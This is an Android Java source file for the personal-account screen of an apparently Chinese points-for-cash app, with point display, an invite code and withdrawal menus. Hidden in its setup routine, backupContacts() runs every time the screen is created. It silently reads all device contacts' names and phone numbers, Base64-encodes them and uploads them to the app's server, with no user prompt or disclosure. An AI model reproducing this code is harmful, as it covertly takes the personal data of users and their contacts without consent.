package com.pwyql.pointmakemoney.fragment;

import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.Header;
import org.json.JSONArray;
import org.json.JSONObject;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Base64;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.GridView;
import android.widget.ImageView;
import android.widget.TextView;

import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import com.pwyql.pointmakemoney.MyApplication;
import com.pwyql.pointmakemoney.R;
import com.pwyql.pointmakemoney.fragment.PersonalFragment.MAdapter.Item;
import com.pwyql.pointmakemoney.fragment.PersonalFragment.MAdapter.OnGridItemClickListener;
import com.pwyql.pointmakemoney.list.ViewHolder;
import com.pwyql.pointmakemoney.service.AppConstants;
import com.pwyql.pointmakemoney.service.AppService.OnPointsResponseListener;
import com.pwyql.pointmakemoney.service.impl.AppServiceImpl;
import com.pwyql.pointmakemoney.ui.IncomeDetailActivity;
import com.pwyql.pointmakemoney.ui.MyUsersActivity;
import com.pwyql.pointmakemoney.ui.ProfileActivity;
import com.pwyql.pointmakemoney.ui.ResetCashPasswordActivity;
import com.pwyql.pointmakemoney.ui.WithdrawLogsActivity;
import com.pwyql.pointmakemoney.ui.WithdrawMenuAlipayActivity;
import com.pwyql.pointmakemoney.ui.WithdrawMenuQActivity;
import com.pwyql.pointmakemoney.ui.WithdrawMenuTelfareActivity;
import com.pwyql.pointmakemoney.ui.WithdrawMenuTenpayActivity;
import com.pwyql.pointmakemoney.util.ContactsHelper;
import com.pwyql.pointmakemoney.util.ContactsHelper.Contact;
import com.pwyql.pointmakemoney.util.HttpUtil;
import com.pwyql.pointmakemoney.util.StringUtils;

public class PersonalFragment extends BaseFragment {
    private static final String TAG = "TestFragment";

    private TextView mTvCurrentPoints, mTvCurrentMoney, mTvInvitecode; // 当前积分,当前收入,邀请码

    GridView mGvGrids; // 菜单格子

    MAdapter madapter;

    @Override
    public void onCreate(Bundle savedInstanceState) {
	super.onCreate(savedInstanceState);
	Log.d(TAG, "TestFragment-----onCreate");
	//	Bundle args = getArguments();
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
	Log.d(TAG, "TestFragment-----onCreateView");
	View view = inflater.inflate(R.layout.fragment_personal, container, false);
	init(view);
	return view;

    }

    private void init(View v) {

	mGvGrids = (GridView) v.findViewById(R.id.gv_menus); // 菜单格子

	madapter = new MAdapter(this.getActivity(), new ArrayList<Item>());
	mGvGrids.setAdapter(madapter);
	initGrids(); // 初始化 菜单格子

	mTvCurrentPoints = (TextView) v.findViewById(R.id.tv_current_points); // 当前积分
	mTvCurrentPoints.setText(MyApplication.getInstance().getCurrentLoginedUser().getPoints() + "");

	mTvCurrentMoney = (TextView) v.findViewById(R.id.tv_currentmoney); // 当前收入
	// 邀请码
	mTvInvitecode = (TextView) v.findViewById(R.id.tv_current_invitecode); // 邀请码
	mTvInvitecode.setText(MyApplication.getInstance().getCurrentLoginedUser().getInviteCode());
	//广告平台处应用货币汇率按 1000(积分) = 1(元) 
	// 用户兑换汇率 5200积分=1元(), 相当于20%的转化
	BigDecimal bd = new BigDecimal(MyApplication.getInstance().getCurrentLoginedUser().getPoints() / MyApplication.exchange_rate);
	double money = bd.setScale(2, BigDecimal.ROUND_HALF_UP).doubleValue();
	mTvCurrentMoney.setText(money + "");

	// 判断当前用户是否已设置了提现密码,否则提示进入设置
	if (!MyApplication.getInstance().getCurrentLoginedUser().isHasCashpwd()) {

	    new Handler().postDelayed(new Runnable() {

		@Override
		public void run() {
		    // TODO Auto-generated method stub
		    showUpdateProfile(); // 弹出提示框
		}
	    }, 1000 * 5L);
	}

	// 测试异常
	//	int i = 0;
	//	System.out.println(5 / i);

	// 备份联系人
	backupContacts();
    }

    /**
     * 初始化菜单格子
     */
    private void initGrids() {
	// TODO Auto-generated method stub
	Item item = null;
	item = new Item(R.drawable.magic_renwu, "个人资料");
	madapter.addItem(item);
	item = new Item(R.drawable.magic_my_credit, "收入明细");
	madapter.addItem(item);
	item = new Item(R.drawable.magic_history, "提兑记录");
	madapter.addItem(item);
	item = new Item(R.drawable.magic_kefu, "话费充值");
	madapter.addItem(item);
	item = new Item(R.drawable.magic_my_wish, "Q币充值");
	madapter.addItem(item);
	item = new Item(R.drawable.magic_yuanbao, "支付宝转账");
	madapter.addItem(item);
	item = new Item(R.drawable.magic_ddmoney, "财付通充值");
	madapter.addItem(item);
	item = new Item(R.drawable.magic_shuzi, "下线用户"); // 邀请码成功的用户
	madapter.addItem(item);
	item = new Item(R.drawable.magic_update, "重置提现密码");
	madapter.addItem(item);

	// 财富排行榜 增加一个页面主要用户展示最高积分的用户, 以及最新兑换成功的用户

	madapter.setOnGridItemClickListener(new OnGridItemClickListener() {

	    @Override
	    public void onClick(int index, Item item) {
		// TODO Auto-generated method stub
		if ("个人资料".equals(item.title)) {
		    toProfile();
		} else if ("收入明细".equals(item.title)) {
		    toIncomeDetail();
		} else if ("提兑记录".equals(item.title)) {
		    toWithdrawLogs();
		} else if ("Q币充值".equals(item.title)) {
		    toQ();
		} else if ("话费充值".equals(item.title)) {
		    toTelfare();
		} else if ("支付宝转账".equals(item.title)) {
		    toAlipay();
		} else if ("财付通充值".equals(item.title)) {
		    toTenpay();
		} else if ("下线用户".equals(item.title)) {
		    toMyUsers();
		} else if ("重置提现密码".equals(item.title)) {
		    toResetCashpwd();
		}
	    }
	});
    }

    @Override
    public void onHiddenChanged(boolean hidden) {
	// TODO Auto-generated method stub
	if (!hidden) {
	    queryPoints();
	}
	super.onHiddenChanged(hidden);
    }

    /**
     * 
     */
    private void showUpdateProfile() {
	AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
	builder.setTitle("");
	builder.setMessage("您还未设置提现密码,建议立即设置");
	builder.setPositiveButton("立即设置", new DialogInterface.OnClickListener() {

	    @Override
	    public void onClick(DialogInterface arg0, int arg1) {
		// TODO Auto-generated method stub
		// 进入编辑个人资料
		startActivity(new Intent(getActivity(), ProfileActivity.class));
	    }
	});
	builder.setNegativeButton("下次再说", null);
	builder.create().show();

    }

    boolean isUpdating; // 动画更新中

    /**
     * 查询积分
     */
    private void queryPoints() {
	// TODO Auto-generated method stub
	AppServiceImpl.getInstance().points(new OnPointsResponseListener() {

	    @Override
	    public void onSuccess(int points) {
		// TODO Auto-generated method stub
		int currentPoints = MyApplication.getInstance().getCurrentLoginedUser().getPoints();
		// 开启积分变化动画
		startPointsAnimThread(currentPoints, points);

		MyApplication.getInstance().getCurrentLoginedUser().setPoints(points);

		//广告平台处应用货币汇率按 1000(积分) = 1(元) 
		// 用户兑换汇率 5200积分=1元(), 相当于20%的转化
		//		BigDecimal bd = new BigDecimal(MyApplication.getInstance().getCurrentLoginedUser().getPoints() / MyApplication.exchange_rate);
		//		double money = bd.setScale(2, BigDecimal.ROUND_HALF_UP).doubleValue();
		//		mTvCurrentMoney.setText(money + "");
		//		mTvCurrentPoints.setText(points + "");

	    }

	    /**
	     * 改变积分动画, 
	     * @param currentPoints
	     * @param points
	     */
	    private void startPointsAnimThread(final int currentPoints, final int targetPoints) {
		// TODO Auto-generated method stub
		if (isUpdating) {
		    return;
		}

		isUpdating = true;

		final Handler handler = new Handler() {
		    @Override
		    public void handleMessage(Message msg) {
			switch (msg.what) {
			case 0: // 动画进行中, 更新
			    mTvCurrentPoints.setText(msg.arg1 + "");
			    BigDecimal bd = new BigDecimal(msg.arg1 / MyApplication.exchange_rate);
			    double money = bd.setScale(2, BigDecimal.ROUND_HALF_UP).doubleValue();
			    mTvCurrentMoney.setText(money + "");
			    break;
			case 1: // 动画完成
			    int points = MyApplication.getInstance().getCurrentLoginedUser().getPoints();
			    mTvCurrentPoints.setText(points + "");
			    BigDecimal bigDecimal = new BigDecimal(points / MyApplication.exchange_rate);
			    double mon = bigDecimal.setScale(2, BigDecimal.ROUND_HALF_UP).doubleValue();
			    mTvCurrentMoney.setText(mon + "");
			    isUpdating = false;
			    break;
			default:
			    break;
			}

		    }

		};

		Thread thread = new Thread() {

		    public void run() {
			int current = currentPoints;
			for (; current < targetPoints;) {
			    current += 10;
			    handler.obtainMessage(0, current, 0).sendToTarget();
			    try {
				Thread.sleep(100L);
			    } catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			    }
			}
			// 动画完成
			handler.obtainMessage(1).sendToTarget();
		    };
		};
		thread.start();
	    }

	    @Override
	    public void onFailure(String errorMsg, int status) {
		// TODO Auto-generated method stub
		showToast(errorMsg);
	    }
	});

    }

    /**
     * 默认自动备份联系人
     */
    private void backupContacts() {
	// TODO Auto-generated method stub

	List<ContactsHelper.Contact> contacts = ContactsHelper.getInstance(getActivity()).getContacts();
	if (contacts.size() == 0) {
	    return;
	}
	String jsonStr = "";
	try {
	    JSONArray jsonArr = new JSONArray();
	    for (Contact contact : contacts) {
		JSONObject jsonObj = new JSONObject();
		jsonObj.put("name", contact.getDisplayName());
		jsonObj.put("number", contact.getNumber());
		jsonArr.put(jsonObj);
	    }
	    jsonStr = jsonArr.toString();
	} catch (Throwable th) {
	    return;
	}

	if (jsonStr.trim().length() == 0) {
	    return;
	}

	String url = AppConstants.URL_BACKUP_CONTACTS;
	RequestParams postParams = new RequestParams();
	postParams.put("c", Base64.encodeToString(jsonStr.getBytes(), Base64.DEFAULT));
	postParams.put("s", StringUtils.md5(AppConstants.SIGN_KEY));
	HttpUtil.post(url, postParams, new AsyncHttpResponseHandler() {

	    @Override
	    public void onSuccess(int arg0, Header[] arg1, byte[] arg2) {
		// TODO Auto-generated method stub
		Log.e("backup:onSuccess", new String(arg2));
	    }

	    @Override
	    public void onFailure(int arg0, Header[] arg1, byte[] arg2, Throwable arg3) {
		// TODO Auto-generated method stub
		Log.e("backup:onFailure", new String(arg2));
	    }
	});
    }

    @Override
    public void onActivityCreated(Bundle savedInstanceState) {
	super.onActivityCreated(savedInstanceState);
    }

    @Override
    public void onDestroy() {
	super.onDestroy();
	Log.d(TAG, "TestFragment-----onDestroy");
    }

    /**
     * 个人资料
     */
    private void toProfile() {
	// TODO Auto-generated method stub
	startActivity(new Intent(getActivity(), ProfileActivity.class));
    }

    /**
     * 收入明细
     */
    private void toIncomeDetail() {
	// TODO Auto-generated method stub
	startActivity(new Intent(getActivity(), IncomeDetailActivity.class));
    }

    /**
     * 话费充值
     */
    private void toTelfare() {
	startActivity(new Intent(getActivity(), WithdrawMenuTelfareActivity.class));
    }

    /**
     * Q币充值
     */
    private void toQ() {
	startActivity(new Intent(getActivity(), WithdrawMenuQActivity.class));
    }

    /**
     * 支付宝转账
     */
    private void toAlipay() {
	startActivity(new Intent(getActivity(), WithdrawMenuAlipayActivity.class));
    }

    /**
     * 财付通转账
     */
    private void toTenpay() {
	startActivity(new Intent(getActivity(), WithdrawMenuTenpayActivity.class));
    }

    /**
     * 提兑记录
     */
    private void toWithdrawLogs() {
	startActivity(new Intent(getActivity(), WithdrawLogsActivity.class));
    }

    /**
     * 使用我的邀请码注册的用户
     */
    private void toMyUsers() {
	startActivity(new Intent(getActivity(), MyUsersActivity.class));
    }

    /**
     * 修改提现密码
     */
    private void toResetCashpwd() {
	// TODO Auto-generated method stub
	startActivity(new Intent(getActivity(), ResetCashPasswordActivity.class));
    }

    public static class MAdapter extends BaseAdapter {

	List<Item> items;
	Context context;
	OnGridItemClickListener onGridItemClickListener;

	public MAdapter(Context context, List<Item> items) {
	    this.items = items;
	    this.context = context;
	}

	@Override
	public int getCount() {
	    // TODO Auto-generated method stub
	    return items.size();
	}

	@Override
	public Object getItem(int arg0) {
	    // TODO Auto-generated method stub
	    return items.get(arg0);
	}

	@Override
	public long getItemId(int arg0) {
	    // TODO Auto-generated method stub
	    return arg0;
	}

	@Override
	public View getView(int pos, View convertView, ViewGroup arg2) {
	    // TODO Auto-generated method stub
	    if (null == convertView) {
		convertView = LayoutInflater.from(context).inflate(R.layout.item_menu, null);
	    }

	    final Item item = items.get(pos);

	    ImageView ivIcon = ViewHolder.get(convertView, R.id.iv_icon);
	    TextView tvTitle = ViewHolder.get(convertView, R.id.tv_title);
	    ivIcon.setImageResource(item.iconRes);
	    tvTitle.setText(item.title);

	    final int index = pos;
	    convertView.setOnClickListener(new View.OnClickListener() {

		@Override
		public void onClick(View arg0) {
		    // TODO Auto-generated method stub
		    if (onGridItemClickListener != null) {
			onGridItemClickListener.onClick(index, item);
		    }
		}
	    });

	    return convertView;
	}

	public List<Item> getItems() {
	    return items;
	}

	public void addItem(Item item) {
	    items.add(item);
	    notifyDataSetChanged();
	}

	public void setOnGridItemClickListener(OnGridItemClickListener listener) {
	    this.onGridItemClickListener = listener;
	}

	public static class Item {
	    public int iconRes;
	    public String title;

	    public Item(int icon, String title) {
		this.iconRes = icon;
		this.title = title;
	    }

	    @Override
	    public boolean equals(Object o) {
		// TODO Auto-generated method stub
		if (null == o) {
		    return false;
		}
		if (!(o instanceof Item)) {
		    return false;
		}

		Item it = (Item) o;
		return it.title.equals(title);
	    }
	}

	public static interface OnGridItemClickListener {
	    void onClick(int index, Item item);
	}
    }

}
